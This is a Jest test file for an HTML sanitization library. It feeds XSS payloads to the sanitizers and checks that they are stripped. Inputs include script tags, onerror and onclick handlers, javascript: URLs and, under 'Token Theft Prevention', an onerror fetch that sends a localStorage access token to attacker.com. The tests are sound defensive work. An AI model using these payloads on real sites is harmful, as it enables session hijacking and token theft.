/**
 * Security Tests for HTML Sanitization
 */

import { describe, it, expect } from '@jest/globals';
import {
  sanitizeHTML,
  sanitizeHTMLStrict,
  stripHTML,
  sanitizeMarkdownToHTML,
} from '@/lib/sanitize';

describe('HTML Sanitization', () => {
  describe('XSS Prevention', () => {
    it('should remove script tags', () => {
      const dirty = '<p>Hello</p><script>alert("XSS")</script>';
      const clean = sanitizeHTML(dirty);
      
      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('alert');
      expect(clean).toContain('<p>Hello</p>');
    });

    it('should remove onclick handlers', () => {
      const dirty = '<button onclick="alert(\'XSS\')">Click</button>';
      const clean = sanitizeHTML(dirty);
      
      expect(clean).not.toContain('onclick');
      expect(clean).not.toContain('alert');
    });

    it('should remove javascript: URLs', () => {
      const dirty = '<a href="javascript:alert(\'XSS\')">Link</a>';
      const clean = sanitizeHTML(dirty);
      
      expect(clean).not.toContain('javascript:');
      expect(clean).not.toContain('alert');
    });

    it('should remove data: URLs with scripts', () => {
      const dirty = '<img src="data:text/html,<script>alert(\'XSS\')</script>">';
      const clean = sanitizeHTML(dirty);
      
      expect(clean).not.toContain('script');
      expect(clean).not.toContain('alert');
    });

    it('should remove onerror handlers', () => {
      const dirty = '<img src="x" onerror="alert(\'XSS\')">';
      const clean = sanitizeHTML(dirty);
      
      expect(clean).not.toContain('onerror');
      expect(clean).not.toContain('alert');
    });
  });

  describe('Strict Sanitization', () => {
    it('should only allow minimal tags', () => {
      const dirty = '<p>Text</p><div>More</div><script>Bad</script>';
      const clean = sanitizeHTMLStrict(dirty);
      
      expect(clean).toContain('<p>');
      expect(clean).not.toContain('<div>');
      expect(clean).not.toContain('<script>');
    });

    it('should remove all attributes', () => {
      const dirty = '<p class="test" id="para">Text</p>';
      const clean = sanitizeHTMLStrict(dirty);
      
      expect(clean).not.toContain('class');
      expect(clean).not.toContain('id');
      expect(clean).toContain('Text');
    });
  });

  describe('Strip HTML', () => {
    it('should remove all HTML tags', () => {
      const dirty = '<p>Hello <strong>World</strong></p>';
      const clean = stripHTML(dirty);
      
      expect(clean).toBe('Hello World');
      expect(clean).not.toContain('<');
      expect(clean).not.toContain('>');
    });
  });

  describe('Markdown to HTML', () => {
    it('should convert markdown safely', () => {
      const markdown = '**Bold** and *italic*';
      const html = sanitizeMarkdownToHTML(markdown);
      
      expect(html).toContain('<strong>Bold</strong>');
      expect(html).toContain('<em>italic</em>');
    });

    it('should escape HTML in markdown', () => {
      const markdown = '**Bold** <script>alert("XSS")</script>';
      const html = sanitizeMarkdownToHTML(markdown);
      
      expect(html).not.toContain('<script>');
      expect(html).toContain('&lt;script&gt;');
    });

    it('should handle line breaks', () => {
      const markdown = 'Line 1\nLine 2';
      const html = sanitizeMarkdownToHTML(markdown);
      
      expect(html).toContain('<br/>');
    });
  });

  describe('Token Theft Prevention', () => {
    it('should prevent token extraction via XSS', () => {
      const malicious = '<img src=x onerror="fetch(\'https://attacker.com?token=\'+localStorage.getItem(\'access_token\'))">';
      const clean = sanitizeHTML(malicious);
      
      expect(clean).not.toContain('onerror');
      expect(clean).not.toContain('localStorage');
      expect(clean).not.toContain('fetch');
    });

    it('should prevent DOM-based XSS', () => {
      const malicious = '<div id="x"></div><script>document.getElementById("x").innerHTML=localStorage.getItem("access_token")</script>';
      const clean = sanitizeHTML(malicious);
      
      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('localStorage');
    });
  });
});
